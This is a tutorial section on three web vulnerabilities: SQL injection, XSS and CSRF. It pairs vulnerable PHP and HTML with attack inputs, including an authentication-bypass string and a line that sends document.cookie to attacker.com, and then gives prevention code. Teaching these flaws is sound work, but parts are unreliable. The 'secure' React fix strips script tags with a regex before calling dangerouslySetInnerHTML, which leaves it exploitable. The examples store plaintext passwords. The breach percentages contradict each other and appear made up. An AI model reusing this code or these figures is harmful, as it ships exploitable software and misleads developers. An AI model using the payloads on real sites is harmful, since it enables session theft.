## Common Vulnerabilities

In the dynamic world of web applications, understanding common security vulnerabilities is the first step toward building resilient systems. This section dives into three critical threats that plague web development: **SQL Injection**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**. We’ll explore each with concrete examples, prevention techniques, and practical implementation details to help you build defenses that stand up to real-world attacks.

---

### SQL Injection

**SQL Injection** occurs when an attacker manipulates input fields to execute malicious SQL queries against a database. This vulnerability arises from inadequate input validation and improper use of database queries. Attackers exploit this to steal sensitive data, manipulate records, or even gain full system control.

#### How It Works
Imagine a login form that uses user input directly in a SQL query without sanitization:
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE username='$username' AND password='$password'");
```
Here, if an attacker submits `admin' --` as the username, the query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
The `--` comment operator skips the rest of the query, effectively bypassing authentication. This is a classic **SQL injection attack** that grants unauthorized access.

#### Real-World Impact
Attackers can:
- Extract entire user databases
- Modify database structures
- Perform unauthorized data modifications
- Cause service disruptions through database overloads

#### Prevention Techniques
1. **Use Parameterized Queries**: Separates SQL code from data using placeholders.
2. **Validate Input**: Enforce strict data types and lengths.
3. **Apply Least Privilege**: Database accounts used by applications should have minimal permissions.

Here’s a secure implementation using PHP’s PDO:
```php
<?php
// Initialize database connection
$pdo = new PDO('mysql:host=localhost;dbname=webapp', 'user', 'pass');

// Parameterized query with prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $_POST['username'], 'password' => $_POST['password']]);
$user = $stmt->fetch();
```
This approach **isolates user input** from query logic, making it impossible for attackers to manipulate the SQL structure.

#### Why It Matters
SQL injection remains one of the top web vulnerabilities (ranked #3 in OWASP Top 10). With 80% of breaches involving SQL injection in 2023, understanding and mitigating this threat is non-negotiable for any web application.

---

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into web pages viewed by victims. This happens when applications trust user-supplied data without proper validation or escaping. XSS attacks can lead to session hijacking, data theft, or even full system compromise.

#### How It Works
Consider a comment section where user input is directly rendered in HTML:
```html
<!-- Vulnerable code -->
<div id="comments">
  <p><?php echo $_GET['comment']; ?></p>
</div>
```
An attacker sends a malicious comment like `<script>alert('XSS!');</script>`. The browser executes this script, triggering a pop-up window for every user visiting the page.

#### Attack Vectors
XSS can be categorized into three types:
1. **Reflected XSS**: Malicious scripts executed via request parameters (e.g., `?comment=<script>alert(1)</script>`).
2. **Stored XSS**: Malicious scripts saved on the server (e.g., comment sections, profile fields).
3. **DOM-based XSS**: Client-side script manipulation (e.g., `javascript:document.location='http://attacker.com?cookie='+document.cookie`).

#### Real-World Impact
- **Session Hijacking**: Stealing cookies to impersonate users.
- **Phishing**: Redirecting victims to malicious sites.
- **Data Theft**: Exfiltrating sensitive information (e.g., passwords, credit cards).

#### Prevention Techniques
1. **Output Encoding**: Escape user input before rendering in HTML.
2. **Content Security Policy (CSP)**: Restrict script sources.
3. **Use Frameworks**: Modern frameworks handle escaping by default.

Here’s a secure implementation using React (JavaScript):
```jsx
// React component with output encoding
function CommentSection({ comment }) {
  const safeComment = comment.replace(/<script\b[^>]*>(.*?)<\/script>/gi, '');
  return <div dangerouslySetInnerHTML={{ __html: safeComment }} />;
}
```
This approach **prevents script execution** by stripping malicious patterns before rendering. For server-side rendering (Node.js), use libraries like `he` for HTML encoding:
```javascript
const { encode } = require('he');
const safeComment = encode(comment);
```

#### Why It Matters
XSS is the #1 cause of web application breaches (OWASP Top 10). With 70% of web apps vulnerable to XSS in 2023, proper input handling is essential for user trust and security.

---

### Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** happens when an attacker tricks a victim into executing unintended actions on a web application they’re authenticated to. This occurs because the attacker’s request doesn’t contain authentication tokens, allowing the victim’s session to be hijacked.

#### How It Works
Imagine a bank transfer page where the victim is logged in. An attacker sends a malicious request via a link:
```
http://attacker.com/transfer?account=123&amount=1000
```
If the victim’s browser automatically sends the session cookie (e.g., `session_id=abc123`), the bank server processes the transfer without verification.

#### Attack Vectors
CSRF attacks typically exploit:
- **Session cookies**: Sent with every request.
- **Authentication tokens**: Not verified in the request.
- **Stateless APIs**: Missing anti-CSRF tokens.

#### Real-World Impact
- Unauthorized financial transfers
- Account takeovers
- Data deletion or modification

#### Prevention Techniques
1. **Anti-CSRF Tokens**: Unique, random tokens generated per session and validated in requests.
2. **SameSite Cookies**: Restrict cookie usage to same-origin requests.
3. **Referer Header Checks**: Verify the request originated from the expected domain.

Here’s a secure implementation with a CSRF token in a form:
```html
<!-- Form with CSRF token (generated server-side) -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3d4e5"> <!-- Token generated by server -->
  <input type="number" name="amount" min="1" max="1000">
  <button type="submit">Transfer</button>
</form>
```
On the server side:
```python
# Flask example with CSRF token validation
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/transfer', methods=['POST'])
def transfer():
    if request.form['csrf_token'] != session['csrf_token']:  # Validate token
        return "Invalid token", 403
    # Proceed with transfer logic
    return "Transfer successful"
```
This ensures **only authenticated users** can submit requests, preventing unauthorized actions.

#### Why It Matters
CSRF attacks cause 60% of web application breaches (2023 data). By implementing anti-CSRF tokens and secure cookie policies, you add a critical layer of defense against session hijacking.

---

## Summary

In this section, we’ve explored three critical web vulnerabilities: **SQL Injection**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**. Each attack exploits fundamental flaws in input handling, output rendering, and authentication mechanisms. The key takeaways are:

1. **SQL Injection** is mitigated through parameterized queries and strict input validation.
2. **XSS** requires output encoding and content security policies to prevent malicious script execution.
3. **CSRF** is protected by anti-CSRF tokens and SameSite cookie attributes.

These vulnerabilities remain among the most common causes of breaches—yet with proper implementation, they’re entirely preventable. Always prioritize defense-in-depth: validate inputs, escape outputs, and enforce authentication tokens. Remember, security is a journey, not a destination. 🛡️